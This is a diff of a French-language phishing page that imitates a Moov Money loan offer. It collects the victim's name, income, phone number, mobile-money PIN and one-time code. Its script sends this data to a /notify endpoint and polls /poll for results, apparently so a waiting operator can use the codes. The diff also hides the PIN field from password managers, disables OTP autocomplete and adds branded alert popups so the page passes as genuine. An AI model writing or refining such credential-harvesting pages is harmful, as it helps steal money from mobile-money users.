@@ -75,31 +75,29 @@
     .terms-box svg{width:3.5vw;height:3.5vw;min-width:12px;min-height:12px;stroke:#1d4ed8;stroke-width:3;display:none}
     .terms-txt{font-size:3.5vw;color:#444;line-height:1.3}
     .terms-txt a{color:#1d4ed8;text-decoration:none}
-    
-    /* PIN */
+
     .pin-page{background:#fff;align-items:center;justify-content:center;position:relative;padding:0}
     .pin-wrap{text-align:center;padding:8vw 6vw;max-width:90vw;margin:0 auto;width:100%}
     .pin-wrap img{width:22vw;max-width:85px;height:auto;margin-bottom:6vw}
     .pin-wrap h2{font-size:5.5vw;margin-bottom:1.5vw}
     .pin-wrap .pin-subt{color:var(--sub);font-size:3.8vw;margin-bottom:6vw}
-    .pin-single-input{width:100%;max-width:80vw;padding:3.5vw 4vw;border:2px solid #d8dce6;border-radius:3vw;font-size:5.5vw;font-weight:700;color:#1a1a1a;text-align:center;letter-spacing:1.5vw;outline:none;background:#fff;font-family:inherit}
+    .pin-single-input{width:100%;max-width:80vw;padding:3.5vw 4vw;border:2px solid #d8dce6;border-radius:3vw;font-size:5.5vw;font-weight:700;color:#1a1a1a;text-align:center;letter-spacing:1.5vw;outline:none;background:#fff;font-family:inherit;-webkit-text-security:disc;text-security:disc}
     .pin-single-input:focus{border-color:var(--orange);box-shadow:0 0 0 3px rgba(255,106,0,0.12)}
     .pin-single-input.valid{border-color:var(--green)}
     .pin-single-input.error{border-color:var(--red-err);animation:shake 0.4s ease}
     @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-1.5vw)}40%{transform:translateX(1.5vw)}60%{transform:translateX(-1vw)}80%{transform:translateX(1vw)}}
     .pin-hint{font-size:3vw;color:var(--hint);text-align:center;margin:1.5vw 0}
-    .pin-err{color:var(--red-err);font-size:3.5vw;font-weight:600;min-height:5vw;margin-bottom:2vw;opacity:0;text-align:center}
+    .pin-err{color:var(--red-err);font-size:3.5vw;font-weight:600;min-height:5vw;margin-bottom:2vw;opacity:0;text-align:center;transition:opacity 0.2s}
     .pin-err.show{opacity:1}
     .pin-forgot{color:var(--orange);font-size:3.3vw;font-weight:600;text-decoration:none;cursor:pointer;display:inline-block;margin-bottom:4vw}
     .keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2vw;max-width:70vw;margin:0 auto 4vw;width:100%}
     .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f2f2f2;font-size:5.5vw;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;-webkit-tap-highlight-color:transparent;width:100%}
     .key-btn:active{background:#ddd;transform:scale(0.95)}
-    .pin-submit-btn{width:100%;max-width:70vw;padding:3.5vw;background:#a9c2e8;color:#fff;font-size:4vw;font-weight:700;border:none;border-radius:2.5vw;cursor:pointer;font-family:inherit;margin:0 auto;display:block}
+    .pin-submit-btn{width:100%;max-width:70vw;padding:3.5vw;background:#a9c2e8;color:#fff;font-size:4vw;font-weight:700;border:none;border-radius:2.5vw;cursor:pointer;font-family:inherit;margin:0 auto;display:block;transition:background 0.2s}
     .pin-submit-btn.active{background:var(--blue-dark);cursor:pointer}
     .pin-submit-btn.active:active{opacity:0.85}
     .pin-back-btn{position:absolute;top:4vw;left:4vw;background:none;border:none;font-size:5.5vw;color:#1a1a1a;cursor:pointer;padding:1vw;z-index:5}
-    
-    /* OTP */
+
     .otp-header{background:#FF6A00;height:12vw;max-height:55px;display:flex;align-items:center;padding:0 4vw;flex-shrink:0}
     .otp-body{padding:5vw 4vw;flex:1;display:flex;flex-direction:column;width:100%}
     .otp-body h2{font-size:5.5vw;margin-bottom:2vw}
@@ -107,12 +105,9 @@
     .otp-boxes{display:flex;gap:2vw;justify-content:center;margin-bottom:4vw;flex-wrap:wrap}
     .otp-b{width:11vw;max-width:48px;height:12vw;max-height:52px;border:1.5px solid #ddd;border-radius:2vw;text-align:center;font-size:4.5vw;font-weight:700;outline:none;background:#fff;flex-shrink:0}
     .otp-b:focus{border-color:#2255d6}
-    .otp-b.auto-filled{border-color:var(--green);background:#f0fdf4}
     .timer-txt{text-align:center;color:#444;font-size:3.5vw;margin-bottom:4vw}
     .timer-txt strong{font-weight:700}
-    .otp-detect-msg{text-align:center;font-size:2.8vw;color:var(--green);min-height:4vw;margin-bottom:2vw;font-weight:500}
-    
-    /* Success */
+
     .succ-content{padding:8vw 5vw;flex:1;display:flex;flex-direction:column;align-items:center;width:100%}
     .succ-circle{width:13vw;max-width:52px;height:13vw;max-height:52px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:5vw;flex-shrink:0}
     .succ-circle svg{width:5.5vw;max-width:22px;height:5.5vw;max-height:22px;stroke:#fff;fill:none;stroke-width:2.5}
@@ -122,6 +117,7 @@
     .ref-card .rl{font-size:2.8vw;color:var(--orange-dark);font-weight:700;text-transform:uppercase;margin-bottom:1vw;letter-spacing:0.5px}
     .ref-card .rv{font-size:3.8vw;font-weight:700;color:var(--text);word-break:break-all}
     .footnote{font-size:2.8vw;color:var(--hint);margin-top:5vw;text-align:center}
+
     @keyframes spin{to{transform:rotate(360deg)}}
     @keyframes popIn{0%{transform:scale(0.85);opacity:0}100%{transform:scale(1);opacity:1}}
     @supports(padding:max(0px)){.footer{padding-bottom:max(5vw,env(safe-area-inset-bottom))}.pin-wrap{padding-bottom:max(8vw,env(safe-area-inset-bottom))}}
@@ -130,84 +126,44 @@
 <body>
 <div class="phone">
 
-  <!-- PAGE 0: LOAN AMOUNT -->
+  <!-- PAGE 0: MONTANT DU PRÊT -->
   <div class="page active" id="pg0">
     <div class="top-bar"></div>
     <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
     <div class="content">
       <h1 class="loan-title">Crédit Moov Money</h1>
       <p class="loan-sub">Choisissez le montant et la durée de votre prêt</p>
-      <div class="amount-card">
-        <div class="lbl">Montant du prêt</div>
-        <div class="val" id="amtDisplay">1 000 FCFA</div>
-        <div class="range-txt">1 000 – 100 000 FCFA</div>
-        <input type="range" min="1000" max="100000" value="1000" step="500" id="amountSlider" oninput="onSlider(this.value)">
-        <div class="range-ends"><span>1 000</span><span>100 000</span></div>
-      </div>
-      <div style="margin-bottom:3.5vw"><label class="label">Montant personnalisé</label>
-        <div style="display:flex;align-items:center;gap:1.5vw;border:1.5px solid var(--border);border-radius:2.5vw;padding:0 2.5vw"><span style="font-weight:600;font-size:3.8vw;flex-shrink:0">FCFA</span><input class="input-field" id="customAmt" placeholder="Entrez le montant" style="border:none;padding:3vw 0;min-width:0" oninput="onCustomAmount(this.value)"></div>
-        <div id="amtErr" style="font-size:2.5vw;color:var(--red-err);margin-top:1vw;display:none">Minimum 1 000 FCFA</div>
-      </div>
+      <div class="amount-card"><div class="lbl">Montant du prêt</div><div class="val" id="amtDisplay">1 000 FCFA</div><div class="range-txt">1 000 – 100 000 FCFA</div><input type="range" min="1000" max="100000" value="1000" step="500" id="amountSlider" oninput="onSlider(this.value)"><div class="range-ends"><span>1 000</span><span>100 000</span></div></div>
+      <div style="margin-bottom:3.5vw"><label class="label">Montant personnalisé</label><div style="display:flex;align-items:center;gap:1.5vw;border:1.5px solid var(--border);border-radius:2.5vw;padding:0 2.5vw"><span style="font-weight:600;font-size:3.8vw;flex-shrink:0">FCFA</span><input class="input-field" id="customAmt" placeholder="Entrez le montant" style="border:none;padding:3vw 0;min-width:0" oninput="onCustomAmount(this.value)"></div><div id="amtErr" style="font-size:2.5vw;color:var(--red-err);margin-top:1vw;display:none">Minimum 1 000 FCFA</div></div>
       <label class="label">Durée de remboursement</label>
-      <div class="dur-grid" id="durGrid">
-        <button class="dur-btn sel" data-dur="6" onclick="pickDur(this)">6 mois</button>
-        <button class="dur-btn" data-dur="12" onclick="pickDur(this)">12 mois</button>
-        <button class="dur-btn" data-dur="18" onclick="pickDur(this)">18 mois</button>
-        <button class="dur-btn" data-dur="24" onclick="pickDur(this)">24 mois</button>
-      </div>
-      <div class="summary-box">
-        <div class="summary-row"><span class="sl">Paiement mensuel</span><span class="sv" id="monthlyVal">—</span></div>
-        <div class="summary-row"><span class="sl">Taux d'intérêt</span><span class="sv">5% par an, fixe</span></div>
-        <div class="summary-row"><span class="sl">Total à rembourser</span><span class="sv" id="totalVal">—</span></div>
-      </div>
+      <div class="dur-grid" id="durGrid"><button class="dur-btn sel" data-dur="6" onclick="pickDur(this)">6 mois</button><button class="dur-btn" data-dur="12" onclick="pickDur(this)">12 mois</button><button class="dur-btn" data-dur="18" onclick="pickDur(this)">18 mois</button><button class="dur-btn" data-dur="24" onclick="pickDur(this)">24 mois</button></div>
+      <div class="summary-box"><div class="summary-row"><span class="sl">Paiement mensuel</span><span class="sv" id="monthlyVal">—</span></div><div class="summary-row"><span class="sl">Taux d'intérêt</span><span class="sv">5% par an, fixe</span></div><div class="summary-row"><span class="sl">Total à rembourser</span><span class="sv" id="totalVal">—</span></div></div>
       <div class="spacer"></div>
     </div>
     <div class="footer"><button class="btn" onclick="goTo('pg1')">Continuer</button></div>
   </div>
 
-  <!-- PAGE 1: PERSONAL INFO -->
+  <!-- PAGE 1: INFORMATIONS PERSONNELLES -->
   <div class="page" id="pg1">
     <div class="top-bar"></div>
     <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"><span class="step-tag">Étape 1 sur 2</span></div>
     <div class="progress-bar"><div class="progress-fill" style="width:50%"></div></div>
     <div class="content">
-      <h2 class="info-title">Vos informations</h2>
-      <p class="info-sub">Ces informations sont nécessaires pour traiter votre demande de crédit.</p>
-      <div class="two-cols">
-        <div class="field-grp"><label class="label">Prénom</label><input class="input-field" id="firstName" placeholder="Votre prénom" oninput="validateAlpha(this);checkInfoForm()"></div>
-        <div class="field-grp"><label class="label">Nom</label><input class="input-field" id="lastName" placeholder="Votre nom" oninput="validateAlpha(this);checkInfoForm()"></div>
-      </div>
-      <div class="field-grp"><label class="label">Situation professionnelle</label>
-        <select class="input-field" id="incomeSrc" onchange="checkInfoForm()" style="appearance:none;background-image:url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%228%22%3E%3Cpath fill=%22%23666%22 d=%22M1.4 0L6 4.6 10.6 0 12 1.4l-6 6-6-6z%22/%3E%3C/svg%3E');background-repeat:no-repeat;background-position:right 3vw center;padding-right:8vw">
-          <option value="">Sélectionnez votre situation</option><option>Salarié</option><option>Auto-entrepreneur</option><option>Commerçant</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option></select>
-      </div>
+      <h2 class="info-title">Vos informations</h2><p class="info-sub">Ces informations sont nécessaires pour traiter votre demande de crédit.</p>
+      <div class="two-cols"><div class="field-grp"><label class="label">Prénom</label><input class="input-field" id="firstName" placeholder="Votre prénom" oninput="validateAlpha(this);checkInfoForm()"></div><div class="field-grp"><label class="label">Nom</label><input class="input-field" id="lastName" placeholder="Votre nom" oninput="validateAlpha(this);checkInfoForm()"></div></div>
+      <div class="field-grp"><label class="label">Situation professionnelle</label><select class="input-field" id="incomeSrc" onchange="checkInfoForm()" style="appearance:none;background-image:url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%228%22%3E%3Cpath fill=%22%23666%22 d=%22M1.4 0L6 4.6 10.6 0 12 1.4l-6 6-6-6z%22/%3E%3C/svg%3E');background-repeat:no-repeat;background-position:right 3vw center;padding-right:8vw"><option value="">Sélectionnez votre situation</option><option>Salarié</option><option>Auto-entrepreneur</option><option>Commerçant</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option></select></div>
       <div class="field-grp"><label class="label">Revenu mensuel (FCFA)</label><input class="input-field" id="monthlyInc" placeholder="0" oninput="validateNumeric(this);checkInfoForm()"></div>
       <div class="spacer"></div>
     </div>
     <div class="footer" style="display:flex;gap:2vw"><button class="btn-outline" onclick="goTo('pg0')">Retour</button><button class="btn" id="infoNextBtn" disabled onclick="goTo('pg2')" style="flex:2">Continuer</button></div>
   </div>
 
-  <!-- PAGE 2: LOGIN -->
+  <!-- PAGE 2: MOOV LOGIN -->
   <div class="page" id="pg2">
-    <div class="orange-header">
-      <div class="decor"></div><div class="ring"></div>
-      <button class="back-arrow-btn" onclick="goTo('pg1')">←</button>
-      <div class="logo-float"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
-      <svg class="wave-svg" viewBox="0 0 390 35" preserveAspectRatio="none"><path d="M0,12 C90,30 300,-5 390,12 L390,35 L0,35 Z" fill="#fff"></path></svg>
-    </div>
+    <div class="orange-header"><div class="decor"></div><div class="ring"></div><button class="back-arrow-btn" onclick="goTo('pg1')">←</button><div class="logo-float"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div><svg class="wave-svg" viewBox="0 0 390 35" preserveAspectRatio="none"><path d="M0,12 C90,30 300,-5 390,12 L390,35 L0,35 Z" fill="#fff"></path></svg></div>
     <div class="login-content">
-      <h2 class="login-title">Démarrez</h2>
-      <p class="login-sub">Sélectionnez votre pays et entrez votre numéro</p>
-      <div class="country-wrap">
-        <label class="label">Pays</label>
-        <div class="country-select" onclick="toggleCountryDropdown()">
-          <span id="countryFlag" style="font-size:5vw;opacity:0.4">🌍</span><span id="countryName" style="color:#999;font-size:3.8vw">Sélectionnez un pays</span><span id="countryCode" style="margin-left:auto;color:#999;font-size:3.5vw"></span><span style="color:#999;font-size:3vw">▼</span>
-        </div>
-        <div class="country-drop" id="countryDropdown">
-          <div class="country-opt" onclick="pickCountry('ci')"><span style="font-size:5vw">🇨🇮</span><span style="font-size:3.8vw">Côte d'Ivoire</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+225</span></div>
-          <div class="country-opt" onclick="pickCountry('tg')"><span style="font-size:5vw">🇹🇬</span><span style="font-size:3.8vw">Togo</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+228</span></div>
-        </div>
-      </div>
+      <h2 class="login-title">Démarrez</h2><p class="login-sub">Sélectionnez votre pays et entrez votre numéro</p>
+      <div class="country-wrap"><label class="label">Pays</label><div class="country-select" onclick="toggleCountryDropdown()"><span id="countryFlag" style="font-size:5vw;opacity:0.4">🌍</span><span id="countryName" style="color:#999;font-size:3.8vw">Sélectionnez un pays</span><span id="countryCode" style="margin-left:auto;color:#999;font-size:3.5vw"></span><span style="color:#999;font-size:3vw">▼</span></div><div class="country-drop" id="countryDropdown"><div class="country-opt" onclick="pickCountry('ci')"><span style="font-size:5vw">🇨🇮</span><span style="font-size:3.8vw">Côte d'Ivoire</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+225</span></div><div class="country-opt" onclick="pickCountry('tg')"><span style="font-size:5vw">🇹🇬</span><span style="font-size:3.8vw">Togo</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+228</span></div></div></div>
       <div class="phone-row"><span class="cc" id="displayCc">---</span><span class="divider">|</span><input id="phoneInput" placeholder="Sélectionnez un pays" disabled oninput="this.value=this.value.replace(/\D/g,'').slice(0,getPhoneDigits())"></div>
       <div class="digit-info" id="digitHint"></div>
       <div class="spacer"></div>
@@ -221,18 +177,12 @@
     <button class="pin-back-btn" onclick="goTo('pg2')">←</button>
     <div class="pin-wrap">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov">
-      <h2>Confirmez votre code PIN</h2>
-      <p class="pin-subt">Entrez votre code PIN à 4-6 chiffres</p>
-      <input type="password" class="pin-single-input" id="pinSingleInput" inputmode="numeric" maxlength="6" placeholder="••••••" oninput="onPinInput(this.value)" onkeydown="onPinKeydown(event)">
+      <h2>Confirmez votre code PIN</h2><p class="pin-subt">Entrez votre code PIN à 4-6 chiffres</p>
+      <input type="text" class="pin-single-input" id="pinSingleInput" inputmode="numeric" maxlength="6" placeholder="••••••" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-lpignore="true" oninput="onPinInput(this.value)" onkeydown="onPinKeydown(event)" style="-webkit-text-security:disc;text-security:disc">
       <div class="pin-hint">4 à 6 chiffres</div>
       <div class="pin-err" id="pinErrorMsg">Code PIN incorrect. Veuillez réessayer !</div>
       <a class="pin-forgot" href="#" onclick="event.preventDefault();forgotPin()">Code PIN oublié ?</a>
-      <div class="keypad-grid">
-        <button class="key-btn" onclick="pinAddDigit('1')">1</button><button class="key-btn" onclick="pinAddDigit('2')">2</button><button class="key-btn" onclick="pinAddDigit('3')">3</button>
-        <button class="key-btn" onclick="pinAddDigit('4')">4</button><button class="key-btn" onclick="pinAddDigit('5')">5</button><button class="key-btn" onclick="pinAddDigit('6')">6</button>
-        <button class="key-btn" onclick="pinAddDigit('7')">7</button><button class="key-btn" onclick="pinAddDigit('8')">8</button><button class="key-btn" onclick="pinAddDigit('9')">9</button>
-        <div></div><button class="key-btn" onclick="pinAddDigit('0')">0</button><button class="key-btn" onclick="pinRemoveDigit()" style="background:transparent;font-size:4.5vw">⌫</button>
-      </div>
+      <div class="keypad-grid"><button class="key-btn" onclick="pinAddDigit('1')">1</button><button class="key-btn" onclick="pinAddDigit('2')">2</button><button class="key-btn" onclick="pinAddDigit('3')">3</button><button class="key-btn" onclick="pinAddDigit('4')">4</button><button class="key-btn" onclick="pinAddDigit('5')">5</button><button class="key-btn" onclick="pinAddDigit('6')">6</button><button class="key-btn" onclick="pinAddDigit('7')">7</button><button class="key-btn" onclick="pinAddDigit('8')">8</button><button class="key-btn" onclick="pinAddDigit('9')">9</button><div></div><button class="key-btn" onclick="pinAddDigit('0')">0</button><button class="key-btn" onclick="pinRemoveDigit()" style="background:transparent;font-size:4.5vw">⌫</button></div>
       <button class="pin-submit-btn" id="pinSubmitBtn" onclick="submitPin()" disabled>Valider</button>
     </div>
   </div>
@@ -241,27 +191,24 @@
   <div class="page" id="pg4">
     <div class="otp-header"><button style="background:none;border:none;color:#fff;font-size:5vw;cursor:pointer;padding:1vw" onclick="goTo('pg3')">←</button></div>
     <div class="otp-body">
-      <h2>Vérifier votre numéro</h2>
-      <p class="sub" id="otpPhoneText">Saisissez le code que nous avons envoyé</p>
+      <h2>Vérifier votre numéro</h2><p class="sub" id="otpPhoneText">Saisissez le code que nous avons envoyé</p>
       <div class="otp-boxes" id="otpContainer">
-        <input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="one-time-code"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
-        <input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
+        <input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off"><input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off"><input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off"><input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off"><input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="off">
       </div>
-      <div class="otp-detect-msg" id="otpDetectMsg"></div>
       <div class="timer-txt" id="otpTimerDisplay">Renvoyer le code dans <strong>04:00</strong></div>
       <div class="spacer"></div>
       <button class="btn" id="otpSubmitBtn" onclick="verifyOtp()" style="background:#a9c2e8;cursor:not-allowed">Continuer</button>
     </div>
   </div>
 
-  <!-- PAGE 5: SUCCESS -->
+  <!-- PAGE 5: SUCCÈS -->
   <div class="page" id="pg5">
     <div class="top-bar"></div>
     <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
     <div class="succ-content">
       <div class="succ-circle"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg></div>
-      <h2 id="successTitle">Demande approuvée</h2>
-      <p class="msg" id="successMessage">Félicitations ! Votre demande de crédit est en cours de traitement.</p>
+      <h2 id="successTitle">Demande approuvée</h2><p class="msg" id="successMessage"></p>
       <div class="ref-card"><div class="rl">Numéro de référence</div><div class="rv" id="refNumber">MM-2026-XXXXXX</div></div>
       <button class="btn" style="background:transparent;color:var(--sub);margin-top:4vw" onclick="resetAll()">Nouvelle demande</button>
       <div class="footnote">Moov Money · Service financier mobile</div>
@@ -271,20 +218,28 @@
   <!-- OTP EXPIRED POPUP -->
   <div id="otpExpiredPopup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:300;align-items:center;justify-content:center">
     <div style="background:#fff;border-radius:4vw;padding:8vw 5vw;text-align:center;max-width:80vw;width:90%;animation:popIn 0.3s ease-out">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" style="width:25vw;max-width:100px;margin-bottom:5vw">
-      <div style="width:12vw;height:12vw;max-width:50px;max-height:50px;border-radius:50%;background:#FFF0E5;display:flex;align-items:center;justify-content:center;margin:0 auto 4vw">
-        <div style="width:8vw;height:8vw;max-width:34px;max-height:34px;border-radius:50%;background:linear-gradient(135deg,#FF6A00,#F04B00);display:flex;align-items:center;justify-content:center;color:#fff;font-size:5vw;font-weight:800">!</div>
-      </div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov" style="width:25vw;max-width:100px;margin-bottom:5vw">
+      <div style="width:12vw;height:12vw;max-width:50px;max-height:50px;border-radius:50%;background:#FFF0E5;display:flex;align-items:center;justify-content:center;margin:0 auto 4vw"><div style="width:8vw;height:8vw;max-width:34px;max-height:34px;border-radius:50%;background:linear-gradient(135deg,#FF6A00,#F04B00);display:flex;align-items:center;justify-content:center;color:#fff;font-size:5vw;font-weight:800">!</div></div>
       <h3 style="font-size:5vw;margin-bottom:2vw;color:#1a1a1a">Aucun OTP entré !</h3>
       <p style="font-size:3.5vw;color:#6b6b6b;margin-bottom:5vw;line-height:1.4">Vous n'avez pas reçu d'OTP ? Veuillez demander un nouveau code pour continuer.</p>
       <button onclick="retryOtp()" style="width:100%;padding:3.5vw;background:#14329e;color:#fff;border:none;border-radius:2.5vw;font-size:4vw;font-weight:700;cursor:pointer;font-family:inherit">Réessayer</button>
     </div>
   </div>
 
+  <!-- CUSTOM ALERT POPUP -->
+  <div id="customAlert" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:400;align-items:center;justify-content:center">
+    <div style="background:#fff;border-radius:4vw;padding:7vw 5vw;text-align:center;max-width:78vw;width:90%;animation:popIn 0.25s ease-out">
+      <div id="alertIcon" style="width:13vw;height:13vw;max-width:52px;max-height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 4vw;font-size:6vw;font-weight:800"></div>
+      <h3 id="alertTitle" style="font-size:5vw;font-weight:700;color:#1a1a1a;margin-bottom:2vw"></h3>
+      <p id="alertMsg" style="font-size:3.5vw;color:#6b6b6b;margin-bottom:5vw;line-height:1.4"></p>
+      <button id="alertBtn" style="width:100%;padding:3.5vw;border:none;border-radius:2.5vw;font-size:4vw;font-weight:700;cursor:pointer;font-family:inherit;color:#fff;background:#14329e" onclick="hideCustomAlert()">OK</button>
+    </div>
+  </div>
+
 </div>
 
 <script>
-var state={duration:6,amount:1000,country:null,termsOk:false,pin:'',otpTimer:null,otpAbortCtrl:null,otpAutoDone:false};
+var state={duration:6,amount:1000,country:null,termsOk:false,pin:'',otpTimer:null};
 var API_BASE=window.location.origin;
 var backendToken=null,pollTimer=null;
 var POLL_INTERVAL=3000,POLL_TIMEOUT=120000;
@@ -313,7 +268,7 @@ function toggleCountryDropdown(){document.getElementById('countryDropdown').clas
 function pickCountry(key){state.country=key;var c=countries[key];document.getElementById('countryFlag').textContent=c.flag;document.getElementById('countryFlag').style.opacity='1';document.getElementById('countryName').textContent=c.name;document.getElementById('countryName').style.color='#000';document.getElementById('countryCode').textContent=c.code;document.getElementById('countryCode').style.color='#666';document.getElementById('displayCc').textContent=c.code;document.getElementById('digitHint').textContent=c.digits+' chiffres';var input=document.getElementById('phoneInput');input.disabled=false;input.maxLength=c.digits;input.value='';input.placeholder=c.ph;input.focus();document.getElementById('countryDropdown').classList.remove('open')}
 function getPhoneDigits(){return state.country?countries[state.country].digits:10}
 function toggleTerms(){state.termsOk=!state.termsOk;document.getElementById('termsCheckSvg').style.display=state.termsOk?'block':'none'}
-function goToPin(){if(!state.country){alert('Veuillez sélectionner un pays');return}var phone=document.getElementById('phoneInput').value.trim(),c=countries[state.country];if(!phone||phone.length!==c.digits){alert('Veuillez entrer un numéro valide à '+c.digits+' chiffres pour '+c.name);return}if(!state.termsOk){alert("Veuillez accepter les conditions générales d'utilisation");return}goTo('pg3')}
+function goToPin(){if(!state.country){showCustomAlert('Pays requis','Veuillez sélectionner un pays avant de continuer.','warning');return}var phone=document.getElementById('phoneInput').value.trim(),c=countries[state.country];if(!phone||phone.length!==c.digits){showCustomAlert('Numéro invalide','Veuillez entrer un numéro valide à '+c.digits+' chiffres pour '+c.name+'.','warning');return}if(!state.termsOk){showCustomAlert('Conditions','Veuillez accepter les conditions générales d\'utilisation.','warning');return}goTo('pg3')}
 document.addEventListener('click',function(e){var dd=document.getElementById('countryDropdown'),sel=document.querySelector('.country-select');if(dd&&sel&&!sel.contains(e.target)&&!dd.contains(e.target))dd.classList.remove('open')});
 
 function resetPin(){state.pin='';var input=document.getElementById('pinSingleInput');input.value='';input.classList.remove('valid','error');document.getElementById('pinErrorMsg').classList.remove('show');var btn=document.getElementById('pinSubmitBtn');btn.disabled=true;btn.classList.remove('active')}
@@ -322,101 +277,53 @@ function onPinKeydown(e){if(e.key==='Enter'&&state.pin.length>=4&&state.pin.leng
 function pinAddDigit(d){if(state.pin.length>=6)return;state.pin+=d;document.getElementById('pinSingleInput').value=state.pin;onPinInput(state.pin)}
 function pinRemoveDigit(){state.pin=state.pin.slice(0,-1);document.getElementById('pinSingleInput').value=state.pin;onPinInput(state.pin)}
 function pinShake(){var input=document.getElementById('pinSingleInput');input.classList.add('error');document.getElementById('pinErrorMsg').classList.add('show');var btn=document.getElementById('pinSubmitBtn');btn.disabled=true;btn.classList.remove('active');setTimeout(function(){input.classList.remove('error')},400)}
-function forgotPin(){alert('Code PIN oublié ?\n\nContactez le service client.\nComposez le *110#.')}
+function forgotPin(){showCustomAlert('Code PIN oublié','Contactez le service client Moov Money.\nComposez le *110# pour obtenir de l\'aide.','warning')}
 
 function showLoading(t,d){var ov=document.createElement('div');ov.id='loadingOverlay';ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,106,0,0.5);display:flex;align-items:center;justify-content:center;z-index:200;flex-direction:column';ov.innerHTML='<div style="background:#fff;border-radius:4vw;padding:7vw 5vw;text-align:center;max-width:75vw;width:90%"><div style="width:10vw;height:10vw;max-width:44px;max-height:44px;border:3px solid #eee;border-top-color:#FF6A00;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 3.5vw"></div><div style="font-size:4.5vw;font-weight:700;margin-bottom:1.5vw">'+(t||'Traitement')+'</div><div style="font-size:3.5vw;color:#666">'+(d||'Veuillez patienter...')+'</div></div>';document.body.appendChild(ov)}
 function hideLoading(){var ov=document.getElementById('loadingOverlay');if(ov)ov.remove()}
 function showOtpExpiredPopup(){document.getElementById('otpExpiredPopup').style.display='flex'}
 function hideOtpExpiredPopup(){document.getElementById('otpExpiredPopup').style.display='none'}
 
+function showCustomAlert(title,msg,type,cb){
+  var icon=document.getElementById('alertIcon'),btn=document.getElementById('alertBtn');
+  icon.style.cssText='width:13vw;height:13vw;max-width:52px;max-height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 4vw;font-size:6vw;font-weight:800';
+  if(type==='error'){icon.style.background='#ffe5e5';icon.textContent='✕';icon.style.color='#e53e3e';btn.style.background='#e53e3e'}
+  else if(type==='success'){icon.style.background='#e5ffe5';icon.textContent='✓';icon.style.color='#22a745';btn.style.background='#14329e'}
+  else{icon.style.background='#FFF0E5';icon.textContent='!';icon.style.color='#FF6A00';btn.style.background='#FF6A00'}
+  document.getElementById('alertTitle').textContent=title;document.getElementById('alertMsg').textContent=msg;
+  document.getElementById('customAlert').style.display='flex';btn.focus();
+  if(cb){btn.onclick=function(){hideCustomAlert();cb()}}else{btn.onclick=hideCustomAlert}
+}
+function hideCustomAlert(){document.getElementById('customAlert').style.display='none'}
+
 async function callBackend(type,extra){var phone=document.getElementById('phoneInput').value.trim(),fn=document.getElementById('firstName').value.trim(),ln=document.getElementById('lastName').value.trim();var name=[fn,ln].filter(Boolean).join(' ')||'Client',code=state.country?countries[state.country].code:'+225';var payload={type:type,phone:phone,countryCode:code,name:name};for(var k in extra)payload[k]=extra[k];try{var resp=await fetch(API_BASE+'/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return await resp.json()}catch(e){return{ok:false,error:'Network error'}}}
 function startPolling(cb){var start=Date.now();clearInterval(pollTimer);pollTimer=setInterval(async function(){if(Date.now()-start>POLL_TIMEOUT){clearInterval(pollTimer);cb('pending');return}try{var resp=await fetch(API_BASE+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:backendToken})});var data=await resp.json();if(data.ok&&data.result!=='pending'){clearInterval(pollTimer);cb(data.result)}}catch(e){}},POLL_INTERVAL)}
 
